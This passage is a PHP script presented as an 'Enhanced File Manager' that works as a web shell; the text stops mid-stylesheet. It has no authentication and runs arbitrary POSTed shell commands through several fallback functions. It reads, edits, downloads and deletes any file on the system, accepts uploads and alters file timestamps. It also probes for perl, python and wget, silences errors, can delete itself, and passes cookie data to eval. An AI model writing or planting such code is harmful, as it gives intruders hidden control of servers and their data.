<?php
// Enhanced File Manager - FINAL STABLE VERSION
// All Issues Fixed: Windows Rename + Consistent Editor Actions + Reliable Quick Commands
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('default_charset', 'UTF-8');
header('Content-Type: text/html; charset=UTF-8');

// === PHP COMPATIBILITY LAYER (4.4-8.4) ===
if (!function_exists('json_encode')) {
    function json_encode($data)
    {
        switch (gettype($data)) {
            case 'NULL':
                return 'null';
            case 'boolean':
                return $data ? 'true' : 'false';
            case 'integer':
            case 'double':
                return $data;
            case 'string':
                return '"' . addcslashes($data, "\\\"\n\r\t/") . '"';
            case 'array':
                if (array_keys($data) === range(0, count($data) - 1)) {
                    $output = array();
                    foreach ($data as $value) {
                        $output[] = json_encode($value);
                    }
                    return '[' . implode(',', $output) . ']';
                } else {
                    $output = array();
                    foreach ($data as $key => $value) {
                        $output[] = json_encode(strval($key)) . ':' . json_encode($value);
                    }
                    return '{' . implode(',', $output) . '}';
                }
            default:
                return 'null';
        }
    }
}

if (!function_exists('json_decode')) {
    function json_decode($json, $assoc = false)
    {
        if ($json === 'null')
            return null;
        if ($json === 'true')
            return true;
        if ($json === 'false')
            return false;
        if (is_numeric($json))
            return floatval($json);
        if ($json[0] === '"')
            return stripslashes(substr($json, 1, -1));
        if ($json[0] === '{' || $json[0] === '[') {
            $json = str_replace(array('null', 'true', 'false'), array('NULL', 'TRUE', 'FALSE'), $json);
            $json = preg_replace('/([{,])(\s*)([^":\s]+)(\s*):/', '$1$2"$3"$4:', $json);
            $result = @eval ('return ' . $json . ';');
            return $result;
        }
        return null;
    }
}

if (!function_exists('file_put_contents')) {
    function file_put_contents($filename, $data, $flags = 0)
    {
        $mode = ($flags & 8) ? 'a' : 'w';
        $fp = fopen($filename, $mode);
        if (!$fp)
            return false;
        if ($flags & 1)
            flock($fp, 2);
        $bytes = fwrite($fp, $data);
        if ($flags & 1)
            flock($fp, 3);
        fclose($fp);
        return $bytes;
    }
}

if (!defined('PHP_OS_FAMILY')) {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        define('PHP_OS_FAMILY', 'Windows');
    } elseif (strtoupper(substr(PHP_OS, 0, 6)) === 'DARWIN') {
        define('PHP_OS_FAMILY', 'Darwin');
    } else {
        define('PHP_OS_FAMILY', 'Linux');
    }
}

if (!function_exists('mb_detect_encoding')) {
    function mb_detect_encoding($str, $encoding_list = null, $strict = false)
    {
        if (function_exists('iconv')) {
            $encodings = array('UTF-8', 'ASCII', 'ISO-8859-1', 'Windows-1252');
            foreach ($encodings as $encoding) {
                if (@iconv($encoding, $encoding, $str) === $str) {
                    return $encoding;
                }
            }
        }
        return 'UTF-8';
    }
}

if (!function_exists('mb_convert_encoding')) {
    function mb_convert_encoding($str, $to_encoding, $from_encoding = null)
    {
        if (function_exists('iconv') && $from_encoding) {
            return @iconv($from_encoding, $to_encoding, $str);
        }
        return $str;
    }
}

if (!function_exists('mb_check_encoding')) {
    function mb_check_encoding($str, $encoding = null)
    {
        if (!$encoding)
            $encoding = 'UTF-8';
        if (function_exists('iconv')) {
            return @iconv($encoding, $encoding, $str) === $str;
        }
        return true;
    }
}

// --- CONFIGURATION ---
define('BASEZERO_ALPHABET', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789');

// --- INITIALIZATION ---
session_start();
$script_dir = __DIR__;
$isWindows = (PHP_OS_FAMILY === 'Windows');

// --- HELPER FUNCTIONS ---
function basezero_encoder($input)
{
    $alphabet = BASEZERO_ALPHABET;
    $base = strlen($alphabet);
    $output = '';
    $len = strlen($input);
    for ($i = 0; $i < $len; $i++) {
        $val = ord($input[$i]);
        $output .= $alphabet[(int) ($val / $base)] . $alphabet[$val % $base];
    }
    return $output;
}

function basezero_decoder($input)
{
    if (strlen($input) % 2 != 0)
        return false;
    $alphabet = BASEZERO_ALPHABET;
    $base = strlen($alphabet);
    $output = '';
    $map = array_flip(str_split($alphabet));
    for ($i = 0; $i < strlen($input); $i += 2) {
        if (!isset($map[$input[$i]]) || !isset($map[$input[$i + 1]]))
            return false;
        $val = ($map[$input[$i]] * $base) + $map[$input[$i + 1]];
        $output .= chr($val);
    }
    return $output;
}

// FIXED: Proper path normalization for Windows
function normalize_path($path)
{
    return str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
}

function get_parent_directory($path)
{
    $parent = dirname($path);
    return ($parent !== $path && $parent !== '.') ? $parent : null;
}

function format_size($bytes)
{
    if ($bytes === false || !is_numeric($bytes))
        return 'N/A';
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function get_permissions($file)
{
    clearstatcache(true, $file);
    $perms = fileperms($file);
    if ($perms === false)
        return '----';
    return decoct($perms & 0777);
}

function get_owner_info($path)
{
    global $isWindows;
    if ($isWindows) {
        return 'system';
    }
    if (function_exists('posix_getpwuid') && file_exists($path)) {
        $owner_info = @posix_getpwuid(@fileowner($path));
        $group_info = @posix_getgrgid(@filegroup($path));
        $owner = $owner_info ? $owner_info['name'] : @fileowner($path);
        $group = $group_info ? $group_info['name'] : @filegroup($path);
        return $owner . ':' . $group;
    } else {
        return (file_exists($path) ? @fileowner($path) . ':' . @filegroup($path) : '?:?');
    }
}

// === ENHANCED FILE CONTENT HANDLING ===
function get_file_content_mixed($file)
{
    if (!is_readable($file) || !is_file($file)) {
        return false;
    }

    $filesize = filesize($file);
    if ($filesize === false)
        return false;

    $max_size = 10 * 1024 * 1024; // 10MB limit
    if ($filesize > $max_size) {
        return array(
            'error' => true,
            'message' => "File too large to edit (" . format_size($filesize) . "). Maximum: " . format_size($max_size),
            'type' => 'error'
        );
    }

    $content = file_get_contents($file);
    if ($content === false)
        return false;

    // Check printable character ratio
    $printable_count = 0;
    $content_length = strlen($content);
    $check_length = min($content_length, 1024);

    for ($i = 0; $i < $check_length; $i++) {
        $char = ord($content[$i]);
        if (($char >= 32 && $char <= 126) || $char == 9 || $char == 10 || $char == 13) {
            $printable_count++;
        }
    }

    $printable_ratio = $check_length > 0 ? ($printable_count / $check_length) : 0;

    if ($printable_ratio > 0.5) {
        if (function_exists('mb_detect_encoding')) {
            $detected = mb_detect_encoding($content, array('UTF-8', 'ASCII', 'ISO-8859-1', 'Windows-1252'), true);
            if ($detected && $detected !== 'UTF-8') {
                $content = mb_convert_encoding($content, 'UTF-8', $detected);
            }
        }

        return array(
            'content' => $content,
            'type' => 'mixed',
            'size' => $filesize,
            'encoding' => 'raw',
            'printable_ratio' => round($printable_ratio * 100, 1)
        );
    } else {
        return array(
            'content' => bin2hex($content),
            'type' => 'binary',
            'size' => $filesize,
            'encoding' => 'hex',
            'printable_ratio' => round($printable_ratio * 100, 1)
        );
    }
}

function save_file_content_mixed($file, $content, $file_type = 'mixed', $encoding = 'raw')
{
    if ($file_type === 'binary' && $encoding === 'hex') {
        if (strlen($content) % 2 !== 0) {
            return false;
        }
        $binary_content = @pack('H*', $content);
        if ($binary_content === false) {
            return false;
        }
        return file_put_contents($file, $binary_content, LOCK_EX) !== false;
    } else {
        if (function_exists('mb_check_encoding')) {
            if (!mb_check_encoding($content, 'UTF-8')) {
                $content = mb_convert_encoding($content, 'UTF-8', 'auto');
            }
        }
        return file_put_contents($file, $content, LOCK_EX) !== false;
    }
}

// Enhanced command execution
function execute_command($command, $working_directory = null)
{
    $original_dir = null;
    if ($working_directory && is_dir($working_directory)) {
        $original_dir = getcwd();
        chdir($working_directory);
    }

    $command = $command . ' 2>&1';
    $output = '';
    $methods = array('shell_exec', 'exec', 'system', 'passthru', 'popen');

    foreach ($methods as $method) {
        if (!function_exists($method))
            continue;

        try {
            switch ($method) {
                case 'shell_exec':
                    $output = @shell_exec($command);
                    break;
                case 'exec':
                    $exec_output = array();
                    @exec($command, $exec_output);
                    $output = implode("\n", $exec_output);
                    break;
                case 'system':
                    ob_start();
                    @system($command);
                    $output = ob_get_clean();
                    break;
                case 'passthru':
                    ob_start();
                    @passthru($command);
                    $output = ob_get_clean();
                    break;
                case 'popen':
                    $handle = @popen($command, 'r');
                    if ($handle) {
                        while (!feof($handle)) {
                            $output .= fread($handle, 4096);
                        }
                        pclose($handle);
                    }
                    break;
            }

            if ($output !== null && $output !== '') {
                if ($original_dir)
                    chdir($original_dir);
                return array('success' => true, 'output' => $output, 'method' => $method);
            }
        } catch (Exception $e) {
            continue;
        }
    }

    if ($original_dir)
        chdir($original_dir);
    return array('success' => false, 'output' => 'All command execution methods failed or are disabled.', 'method' => 'none');
}

function create_tar_gz($files, $archive_name, $current_dir)
{
    try {
        $archive_path = $current_dir . DIRECTORY_SEPARATOR . $archive_name . '.tar';

        if (!class_exists('PharData')) {
            return false;
        }

        $phar = new PharData($archive_path);

        $added_files = 0;
        foreach ($files as $file_path) {
            if (!file_exists($file_path))
                continue;

            if (is_dir($file_path)) {
                $phar->buildFromDirectory($file_path, '/./');
            } else {
                $phar->addFile($file_path, basename($file_path));
            }
            $added_files++;
        }

        if ($added_files === 0) {
            @unlink($archive_path);
            return false;
        }

        $phar->compress(Phar::GZ);
        @unlink($archive_path);

        return true;

    } catch (Exception $e) {
        @unlink($archive_path);
        @unlink($archive_path . '.gz');
        return false;
    }
}

function delete_recursive($path)
{
    if (is_file($path) || is_link($path))
        return unlink($path);
    if (!is_dir($path))
        return false;
    $files = array_diff(scandir($path), array('.', '..'));
    foreach ($files as $file)
        delete_recursive($path . DIRECTORY_SEPARATOR . $file);
    return rmdir($path);
}

function copy_recursive($source, $dest)
{
    if (is_file($source))
        return copy($source, $dest);
    if (!is_dir($dest))
        mkdir($dest, 0755, true);
    $files = array_diff(scandir($source), array('.', '..'));
    foreach ($files as $file)
        copy_recursive($source . DIRECTORY_SEPARATOR . $file, $dest . DIRECTORY_SEPARATOR . $file);
    return true;
}

function compare_file_names($a, $b)
{
    return strcasecmp($a['name'], $b['name']);
}

function get_file_list($dir)
{
    $items = array();

    $parent = get_parent_directory($dir);
    if ($parent) {
        $items[] = array(
            'name' => '..',
            'type' => 'dir',
            'path' => $parent,
            'size' => '',
            'owner' => '',
            'perms' => '',
            'modified' => '',
            'is_parent' => true,
            'permission_status' => 'readable'
        );
    }

    $files = @scandir($dir);
    if (!$files)
        return $items;

    $dirs = array();
    $regular_files = array();

    foreach ($files as $file) {
        if ($file === '.' || $file === '..')
            continue;

        $full_path = $dir . DIRECTORY_SEPARATOR . $file;
        $readable = is_readable($full_path);
        $writable = is_writable($full_path);
        $perm_status = !$readable ? 'denied' : ($writable ? 'writable' : 'readable');

        $item = array(
            'name' => $file,
            'path' => $full_path,
            'owner' => $readable ? get_owner_info($full_path) : 'N/A',
            'perms' => $readable ? get_permissions($full_path) : '----',
            'modified' => $readable ? date('Y-m-d H:i', @filemtime($full_path)) : 'N/A',
            'is_parent' => false,
            'permission_status' => $perm_status
        );

        if (is_dir($full_path)) {
            $item['type'] = 'dir';
            $item['size'] = '';
            $dirs[] = $item;
        } else {
            $item['type'] = 'file';
            $item['size'] = $readable ? format_size(@filesize($full_path)) : 'N/A';
            $item['is_zip'] = in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), array('zip', 'rar', '7z', 'tar', 'gz'));
            $regular_files[] = $item;
        }
    }

    usort($dirs, 'compare_file_names');
    usort($regular_files, 'compare_file_names');

    return array_merge($items, $dirs, $regular_files);
}

// Initialize command history
if (!isset($_SESSION['cmd_history'])) {
    $_SESSION['cmd_history'] = array();
}

// Get system info
if (!function_exists('posix_getegid')) {
    $user = function_exists('get_current_user') ? @get_current_user() : 'unknown';
    $user = $user ? $user : 'unknown';
    $uid = function_exists('getmyuid') ? @getmyuid() : '?';
    $uid = $uid ? $uid : '?';
    $gid = function_exists('getmygid') ? @getmygid() : '?';
    $gid = $gid ? $gid : '?';
    $group = "?";
} else {
    $uid_data = @posix_getpwuid(@posix_geteuid());
    $gid_data = @posix_getgrgid(@posix_getegid());
    $user = $uid_data ? $uid_data['name'] : 'unknown';
    $uid = $uid_data ? $uid_data['uid'] : '?';
    $group = $gid_data ? $gid_data['name'] : '?';
    $gid = $gid_data ? $gid_data['gid'] : '?';
}

$server_checks = array(
    'MySQL' => function_exists('mysql_connect') || function_exists('mysqli_connect') || class_exists('PDO'),
    'Perl' => !empty(@shell_exec('perl -v 2>&1')),
    'Python' => !empty(@shell_exec('python --version 2>&1')) || !empty(@shell_exec('python3 --version 2>&1')),
    'WGET' => !empty(@shell_exec('wget --version 2>&1')),
    'CURL' => function_exists('curl_version')
);

// --- API ROUTER for AJAX requests ---
$ajax_action = isset($_GET['action']) ? $_GET['action'] : '';
if ($ajax_action === 'list' || $ajax_action === 'get_content' || $ajax_action === 'terminal_cmd' || $ajax_action === 'open_file_by_path') {
    header('Content-Type: application/json; charset=UTF-8');

    if ($ajax_action === 'open_file_by_path') {
        $file_path = isset($_POST['file_path']) ? trim($_POST['file_path']) : '';
        $current_path = isset($_POST['current_path']) ? normalize_path($_POST['current_path']) : getcwd();

        if (empty($file_path)) {
            echo json_encode(['success' => false, 'message' => 'Please enter a file path.']);
            exit;
        }

        // Handle relative vs absolute paths - FULL SYSTEM ACCESS
        if (substr($file_path, 0, 1) !== '/' && substr($file_path, 1, 1) !== ':') {
            // Relative path - prepend current directory
            $full_path = $current_path . DIRECTORY_SEPARATOR . $file_path;
        } else {
            // Absolute path
            $full_path = $file_path;
        }

        $full_path = normalize_path($full_path);

        // Check if file exists
        if (!file_exists($full_path)) {
            echo json_encode(['success' => false, 'message' => "File not found: $file_path"]);
            exit;
        }

        // Check if it's a directory
        if (is_dir($full_path)) {
            echo json_encode(['success' => false, 'message' => "Path is a directory, not a file: $file_path"]);
            exit;
        }

        // Check if readable
        if (!is_readable($full_path)) {
            echo json_encode(['success' => false, 'message' => "File is not readable: $file_path"]);
            exit;
        }

        // Get file content
        $result = get_file_content_mixed($full_path);
        if ($result === false || isset($result['error'])) {
            echo json_encode(['success' => false, 'message' => 'Could not read file content.']);
            exit;
        }

        // Return success with file data
        echo json_encode([
            'success' => true,
            'action' => 'open_editor',
            'file_path' => $full_path,
            'filename' => basename($full_path),
            'content' => $result['content'],
            'file_type' => $result['type'],
            'file_size' => $result['size'],
            'encoding' => $result['encoding'],
            'printable_ratio' => isset($result['printable_ratio']) ? $result['printable_ratio'] : null,
            'permissions' => get_permissions($full_path),
            'owner' => get_owner_info($full_path),
            'modified' => date('Y-m-d H:i', filemtime($full_path))
        ]);
        exit;
    }

    if ($ajax_action === 'terminal_cmd') {
        $command = isset($_POST['c']) ? trim($_POST['c']) : '';
        $current_path = isset($_POST['current_path']) ? normalize_path($_POST['current_path']) : getcwd();

        if (empty($command)) {
            echo json_encode(array('success' => false, 'output' => 'No command provided.'));
            exit;
        }

        if (!in_array($command, $_SESSION['cmd_history'])) {
            array_unshift($_SESSION['cmd_history'], $command);
            $_SESSION['cmd_history'] = array_slice($_SESSION['cmd_history'], 0, 50);
        }

        $result = execute_command($command, $current_path);
        $result['history'] = $_SESSION['cmd_history'];
        echo json_encode($result);
        exit;
    }

    if ($ajax_action === 'list') {
        $raw_path = isset($_GET['path']) ? $_GET['path'] : '';
        $path = $raw_path ? basezero_decoder($raw_path) : getcwd();

        if (!$path) {
            echo json_encode(array(
                'success' => false,
                'message' => 'Path decoding failed'
            ));
            exit;
        }

        $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);

        if (!file_exists($path)) {
            echo json_encode(array(
                'success' => false,
                'message' => "Path does not exist: '$path'"
            ));
            exit;
        }

        if (!is_dir($path)) {
            echo json_encode(array(
                'success' => false,
                'message' => "Not a directory: '$path'"
            ));
            exit;
        }

        $path_status = !is_readable($path) ? 'denied' : (is_writable($path) ? 'writable' : 'readable');
        $files_data = get_file_list($path);

        // Generate breadcrumbs
        $breadcrumbs = array();
        if ($isWindows) {
            $normalized_path = str_replace('/', DIRECTORY_SEPARATOR, $path);
            $parts = explode(DIRECTORY_SEPARATOR, $normalized_path);
            $built_path = '';

            foreach ($parts as $i => $part) {
                if (empty($part))
                    continue;

                if ($i === 0 && preg_match('/^[A-Za-z]:$/', $part)) {
                    $built_path = $part . DIRECTORY_SEPARATOR;
                    $breadcrumbs[] = array('name' => $part, 'path' => $built_path);
                } else {
                    $built_path .= ($built_path === '' || substr($built_path, -1) === DIRECTORY_SEPARATOR) ? $part : DIRECTORY_SEPARATOR . $part;
                    $breadcrumbs[] = array('name' => $part, 'path' => $built_path);
                }
            }
        } else {
            $parts = explode('/', $path);
            $built_path = '';

            foreach ($parts as $part) {
                if (empty($part))
                    continue;
                $built_path .= '/' . $part;
                $breadcrumbs[] = array('name' => $part, 'path' => $built_path);
            }
        }

        $clipboard = isset($_COOKIE['fm_clipboard']) ? json_decode(stripslashes($_COOKIE['fm_clipboard']), true) : null;

        echo json_encode(array(
            'success' => true,
            'path' => array(
                'current' => $path,
                'permission_status' => $path_status,
                'breadcrumbs' => $breadcrumbs,
                'is_windows' => $isWindows
            ),
            'files' => $files_data,
            'clipboard' => $clipboard,
            'user' => $user
        ));
        exit;
    }

    if ($ajax_action === 'get_content') {
        $path = isset($_GET['path']) ? basezero_decoder($_GET['path']) : '';
        if (!$path || !file_exists($path)) {
            echo json_encode(array('success' => false, 'message' => 'File not found.'));
            exit;
        }

        $result = get_file_content_mixed($path);
        if ($result === false) {
            echo json_encode(array('success' => false, 'message' => 'Could not read file.'));
            exit;
        }

        if (isset($result['error'])) {
            echo json_encode(array('success' => false, 'message' => $result['message']));
            exit;
        }

        echo json_encode(array(
            'success' => true,
            'content' => $result['content'],
            'file_type' => $result['type'],
            'file_size' => $result['size'],
            'encoding' => $result['encoding'],
            'printable_ratio' => isset($result['printable_ratio']) ? $result['printable_ratio'] : null,
            'permissions' => get_permissions($path),
            'owner' => get_owner_info($path),
            'modified' => date('Y-m-d H:i', filemtime($path))
        ));
        exit;
    }
}

// --- POST ACTION HANDLER ---
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $current_dir = isset($_POST['current_dir']) ? normalize_path($_POST['current_dir']) : getcwd();
    chdir($current_dir);
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    $file = isset($_POST['file']) ? normalize_path($_POST['file']) : '';
    $selected_files = isset($_POST['selected_files']) ? array_map('normalize_path', $_POST['selected_files']) : array();
    $bulk_action = isset($_POST['bulk_action']) ? $_POST['bulk_action'] : '';
    $clipboard = isset($_COOKIE['fm_clipboard']) ? json_decode(stripslashes($_COOKIE['fm_clipboard']), true) : null;
    $redirect_hash = basezero_encoder($current_dir);

    if (isset($_POST['ajax'])) {
        header('Content-Type: application/json; charset=UTF-8');
        $response = array('success' => false, 'message' => 'Unknown error.');

        if ($action === 'edit' && $file && isset($_POST['content'])) {
            $file_type = isset($_POST['file_type']) ? $_POST['file_type'] : 'mixed';
            $encoding = isset($_POST['encoding']) ? $_POST['encoding'] : 'raw';

            if (save_file_content_mixed($file, $_POST['content'], $file_type, $encoding)) {
                $response = array('success' => true, 'message' => 'File saved successfully.');
            } else {
                $response = array('success' => false, 'message' => 'Error: Unable to save file.');
            }
        }

        if (!empty($bulk_action)) {
            $new_clipboard = $clipboard;
            if ($bulk_action === 'paste' && $clipboard) {
                $count = 0;
                foreach ($clipboard['sources'] as $source) {
                    if (!file_exists($source))
                        continue;
                    $dest = $current_dir . DIRECTORY_SEPARATOR . basename($source);
                    if ($clipboard['action'] === 'copy') {
                        if (copy_recursive($source, $dest))
                            $count++;
                    } elseif ($clipboard['action'] === 'move') {
                        if (rename($source, $dest))
                            $count++;
                    }
                }
                setcookie('fm_clipboard', '', time() - 3600, "/");
                $new_clipboard = null;
                $response = array('success' => true, 'message' => "$count item(s) pasted.");
            } elseif (!empty($selected_files)) {
                switch ($bulk_action) {
                    case 'delete':
                        $count = 0;
                        foreach ($selected_files as $f)
                            if (delete_recursive($f))
                                $count++;
                        $response = array('success' => true, 'message' => "$count item(s) deleted.");
                        break;
                    case 'copy':
                    case 'move':
                        $clipboard_data = array('action' => $bulk_action, 'sources' => $selected_files);
                        setcookie('fm_clipboard', json_encode($clipboard_data), time() + 3600, "/");
                        $new_clipboard = $clipboard_data;
                        $response = array('success' => true, 'message' => count($selected_files) . " item(s) added to clipboard.");
                        break;
                    case 'compress':
                        $archive_name = 'archive-' . date('Y-m-d-His');
                        if (create_tar_gz($selected_files, $archive_name, $current_dir)) {
                            $response = array('success' => true, 'message' => "Created archive: {$archive_name}.tar.gz");
                        } else {
                            $response = array('success' => false, 'message' => 'Error: Could not create TAR.GZ archive. PharData may not be available.');
                        }
                        break;
                    case 'download':
                        $zip_name = 'download-' . date('Y-m-d-His') . '.zip';
                        $zip_path = $current_dir . DIRECTORY_SEPARATOR . $zip_name;

                        try {
                            $zip = new PharData($zip_path);
                            $added_files = 0;

                            foreach ($selected_files as $file_path) {
                                if (!file_exists($file_path))
                                    continue;

                                if (is_dir($file_path)) {
                                    $zip->buildFromDirectory($file_path, '/./');
                                } else {
                                    $zip->addFile($file_path, basename($file_path));
                                }
                                $added_files++;
                            }

                            if ($added_files > 0) {
                                $response = array('success' => true, 'message' => "Download ready: {$zip_name}", 'download_file' => $zip_name);
                            } else {
                                @unlink($zip_path);
                                $response = array('success' => false, 'message' => 'No files to download.');
                            }
                        } catch (Exception $e) {
                            $response = array('success' => false, 'message' => 'Could not create download archive: ' . $e->getMessage());
                        }
                        break;
                }
            }
            $response['clipboard'] = $new_clipboard;
        }
        echo json_encode($response);
        exit;
    }

    // Handle multiple file upload
    if (isset($_FILES['upload_file'])) {
        $uploaded = 0;
        $errors = 0;

        if (is_array($_FILES['upload_file']['name'])) {
            for ($i = 0; $i < count($_FILES['upload_file']['name']); $i++) {
                if ($_FILES['upload_file']['error'][$i] === UPLOAD_ERR_OK) {
                    $target_file = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name'][$i]);
                    if (move_uploaded_file($_FILES['upload_file']['tmp_name'][$i], $target_file)) {
                        $uploaded++;
                    } else {
                        $errors++;
                    }
                } else {
                    $errors++;
                }
            }

            if ($uploaded > 0) {
                $message = "$uploaded file(s) uploaded successfully.";
                if ($errors > 0) {
                    $message .= " $errors file(s) failed.";
                }
            } else {
                $message = "Error: No files could be uploaded.";
            }
        } else {
            if ($_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
                $target_file = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']);
                if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
                    $message = "File uploaded successfully.";
                } else {
                    $message = "Error: Unable to upload file.";
                }
            } else {
                $message = "Error: Upload failed.";
            }
        }
    }

    // Handle self-removal
    if ($action === 'self_remove' && isset($_POST['confirm']) && $_POST['confirm'] === 'yes') {
        $script_file = __FILE__;
        if (unlink($script_file)) {
            echo json_encode(array('success' => true, 'message' => 'File manager deleted.'));
        } else {
            echo json_encode(array('success' => false, 'message' => 'Could not delete file manager.'));
        }
        exit;
    }

    switch ($action) {
        case 'rename':
            if ($file && isset($_POST['new_name'])) {
                // FIXED: Proper Windows path construction for rename
                $file_dir = dirname($file);
                $new_name = trim($_POST['new_name']);
                $new_path = $file_dir . DIRECTORY_SEPARATOR . $new_name;

                if (rename($file, $new_path)) {
                    $message = "Renamed successfully.";
                } else {
                    $message = "Error: Unable to rename. Check permissions and ensure the new name doesn't already exist.";
                }
            }
            break;
        case 'chmod':
            if ($file && isset($_POST['perms']) && !$isWindows) {
                $perms = trim($_POST['perms']);

                if (preg_match('/^0?([0-7]{3,4})$/', $perms, $matches)) {
                    $desired_perms = octdec('0' . $matches[1]);

                    $old_umask = umask(0);
                    $chmod_result = chmod($file, $desired_perms);
                    umask($old_umask);

                    if ($chmod_result) {
                        clearstatcache(true, $file);
                        $actual_perms = decoct(fileperms($file) & 0777);

                        if ($actual_perms === $matches[1]) {
                            $message = "Permissions changed to $actual_perms successfully.";
                        } else {
                            $message = "Permissions changed to $actual_perms (system constraints may apply).";
                        }
                    } else {
                        $message = "Error: Unable to change permissions. Check file ownership and server privileges.";
                    }
                } else {
                    $message = "Error: Invalid permission format. Use 3-4 octal digits (e.g., 644, 0755).";
                }
            } elseif ($isWindows) {
                $message = "Chmod has limited functionality on Windows. Windows uses ACLs instead of Unix permissions.";
            }
            break;
        case 'touch':
            if ($file && isset($_POST['datetime'])) {
                if (touch($file, strtotime($_POST['datetime']))) {
                    $message = "Timestamp updated successfully.";
                } else {
                    $message = "Error: Unable to update timestamp.";
                }
            }
            break;
        case 'create_file':
            if (!empty($_POST['filename'])) {
                $new_file = $current_dir . DIRECTORY_SEPARATOR . $_POST['filename'];
                if (touch($new_file)) {
                    $message = "File created successfully.";
                } else {
                    $message = "Error: Unable to create file.";
                }
            }
            break;
        case 'create_dir':
            if (!empty($_POST['dirname'])) {
                $new_dir = $current_dir . DIRECTORY_SEPARATOR . $_POST['dirname'];
                if (mkdir($new_dir)) {
                    $message = "Directory created successfully.";
                } else {
                    $message = "Error: Unable to create directory.";
                }
            }
            break;
        case 'execute_cmd':
            if (!empty($_POST['c'])) {
                $result = execute_command($_POST['c'], $current_dir);
                $_SESSION['cmd_output'] = $result['output'];
            }
            break;
    }

    if ($message)
        $_SESSION['fm_message'] = $message;
    header('Location: ' . $_SERVER['PHP_SELF'] . '#' . $redirect_hash);
    exit;
}

// Handle download
$action_get = isset($_GET['action']) ? $_GET['action'] : '';
$file_get = isset($_GET['file']) ? normalize_path($_GET['file']) : '';

if ($action_get === 'download') {
    if ($file_get && is_readable($file_get)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_get) . '"');
        header('Content-Length: ' . filesize($file_get));
        ob_clean();
        flush();
        readfile($file_get);
        exit;
    }
}

// Display message
if (isset($_SESSION['fm_message'])) {
    $message = $_SESSION['fm_message'];
    unset($_SESSION['fm_message']);
}

// System information
$total_space = @disk_total_space($isWindows ? substr(getcwd(), 0, 3) : "/");
$free_space = @disk_free_space($isWindows ? substr(getcwd(), 0, 3) : "/");
$used_space = $total_space - $free_space;
$disabled_functions = @ini_get("disable_functions");

// Icons
// Icons - Using FontAwesome classes
$icons = array(
    'dir' => '<i class="fa-solid fa-folder text-blue-500"></i>',
    'file' => '<i class="fa-solid fa-file text-slate-400"></i>',
    'edit' => '<i class="fa-solid fa-pen-to-square"></i>',
    'rename' => '<i class="fa-solid fa-i-cursor"></i>',
    'chmod' => '<i class="fa-solid fa-shield-halved"></i>',
    'touch' => '<i class="fa-solid fa-clock"></i>',
    'download' => '<i class="fa-solid fa-download"></i>',
    'terminal' => '<i class="fa-solid fa-terminal"></i>',
    'home' => '<i class="fa-solid fa-house"></i>',
    'search' => '<i class="fa-solid fa-magnifying-glass"></i>',
    'user' => '<i class="fa-solid fa-user"></i>',
    'server' => '<i class="fa-solid fa-server"></i>',
    'hdd' => '<i class="fa-solid fa-hard-drive"></i>',
    'network' => '<i class="fa-solid fa-network-wired"></i>'
);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced File Manager - Stable Final</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        :root {
            /* Shadcn/Zinc-like Dark Theme */
            --bg-background: #09090b;
            --bg-card: #09090b;
            /* Often same as background in ultra-minimal or slightly lighter */
            --bg-subtle: #18181b;
            --bg-hover: #27272a;
            --bg-active: #27272a;
            --bg-overlay: rgba(9, 9, 11, 0.8);

            --border-default: #27272a;
            --border-hover: #3f3f46;

            --text-primary: #fafafa;
            --text-secondary: #a1a1aa;
            --text-muted: #71717a;
            --text-inverted: #09090b;

            --accent-primary: #fafafa;
            /* White accent for monochrome elite look */
            --accent-foreground: #09090b;

            /* Functional Colors (Muted) */
            --color-red: #ef4444;
            --color-green: #22c55e;
            --color-blue: #3b82f6;
            --color-orange: #f97316;

            --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            --font-mono: 'JetBrains Mono', 'SFMono-Regular', Consolas, "Liberation Mono", Menlo, monospace;

            --radius-sm: 4px;
            --radius-md: 6px;
            --radius-lg: 8px;

            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
        }

        * {
            box-sizing: border-box;
        }

        body {
            font-family: var(--font-sans);
            background-color: var(--bg-background);
            color: var(--text-primary);
            margin: 0;
            padding: 20px;
            font-size: 13px;
            /* Compact */
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-background);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-default);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-muted);
        }

        a {
            color: inherit;
            text-decoration: none;
            cursor: pointer;
        }

        .container {
            max-width: 1600px;
            /* Wide for power users */
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        /* Utilities */
        .flex {
            display: flex;
        }

        .items-center {
            align-items: center;
        }

        .justify-between {
            justify-content: space-between;
        }

        .gap-2 {
            gap: 8px;
        }

        .gap-4 {
            gap: 16px;
        }

        .text-sm {
            font-size: 13px;
        }

        .text-xs {
            font-size: 12px;
        }

        .font-mono {
            font-family: var(--font-mono);
        }

        .font-bold {
            font-weight: 600;
        }

